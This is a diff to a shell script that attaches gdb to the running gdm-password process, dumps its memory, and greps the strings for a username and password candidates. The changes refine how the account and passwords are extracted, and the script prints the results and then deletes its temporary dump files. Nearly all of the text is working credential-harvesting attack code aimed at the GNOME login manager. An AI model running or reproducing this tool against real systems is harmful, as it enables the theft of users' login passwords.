@@ -26,12 +26,13 @@ gdb=$(which gdb)
 strings=$(which strings)
 commands="commands.txt"
 gdmpassword_pid=$(ps aux |grep 'gdm-password' |grep -v grep |awk '{print $2}')
+
 $gdb -p $gdmpassword_pid -x $commands --batch-silent 2>/dev/null
-
 $strings /tmp/core_file > /tmp/core_strings
-password=$(grep -A6 "myhostname" /tmp/core_strings)
-account=$(cat /tmp/core_strings | grep -A1 username |grep -v username |grep -A2 'op.DBus' |grep -v 'op.DBus' |grep -A1 root)
 
-echo -e 'USERNAME:' $account '\nPASSWORD CANDIDATES:\n' $password
+account=$(grep 'HOME=' /tmp/core_strings |cut -f2 -d"/")
+password=$(grep -E -C2 "myhostname|protocols" /tmp/core_strings |grep -v '\-\-')
 
+echo -e 'USERNAME:' $account '\n\nPASSWORD CANDIDATES:\n' 
+echo $password\ | tr " " "\n"
 rm /tmp/core_strings && rm /tmp/core_file
